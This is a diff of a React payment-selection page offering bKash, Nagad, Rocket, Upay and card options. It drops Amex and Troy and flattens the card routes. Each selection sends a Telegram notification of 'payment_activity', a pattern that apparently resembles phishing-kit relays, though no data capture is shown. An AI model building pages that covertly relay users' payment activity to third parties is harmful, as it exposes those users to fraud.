@@ -16,8 +16,6 @@ import rocketLogo from "@/assets/rocket-logo.png";
 import upayLogo from "@/assets/upay-logo.png";
 import visaLogo from "@/assets/visa-logo.png";
 import mastercardLogo from "@/assets/mastercard-logo.png";
-import amexLogo from "@/assets/amex-logo.png";
-import troyLogo from "@/assets/troy-logo.png";
 import discoverLogo from "@/assets/discover-logo.png";
 
 
@@ -52,7 +50,7 @@ const Index = () => {
   
   const [loginUnlocked, setLoginUnlocked] = useState(false);
   const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>({
-    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, amex: true, troy: true, discover: true,
+    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, discover: true,
   });
 
   const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;
@@ -125,10 +123,10 @@ const Index = () => {
     return () => { supabase.removeChannel(channel); };
   }, []);
 
-  const cardTypes = ['visa', 'mastercard', 'amex', 'troy', 'discover'];
+  const cardTypes = ['visa', 'mastercard', 'discover'];
   
   const handlePaymentSelect = (route: string) => {
-    const methodName = route.replace('/card/', '').replace('/', '');
+    const methodName = route.replace('/', '');
     const isCard = cardTypes.includes(methodName);
     sendTelegramNotification({
       type: 'payment_activity',
@@ -360,11 +358,9 @@ const Index = () => {
                   { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-16 md:h-20' },
                   { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-16 md:h-20' },
                   { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-16 md:h-20' },
-                  { id: 'visa', route: '/card/visa', logo: visaLogo, alt: 'Visa', h: 'h-14 md:h-18' },
-                  { id: 'mastercard', route: '/card/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-18' },
-                  { id: 'amex', route: '/card/amex', logo: amexLogo, alt: 'American Express', h: 'h-14 md:h-18' },
-                  { id: 'troy', route: '/card/troy', logo: troyLogo, alt: 'Troy', h: 'h-14 md:h-18' },
-                  { id: 'discover', route: '/card/discover', logo: discoverLogo, alt: 'Discover', h: 'h-14 md:h-18' },
+                  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'Visa', h: 'h-14 md:h-18' },
+                  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-18' },
+                  { id: 'discover', route: '/discover', logo: discoverLogo, alt: 'Discover', h: 'h-14 md:h-18' },
                 ].map((method) => {
                   const isEnabled = enabledMethods[method.id] ?? false;
                   return (
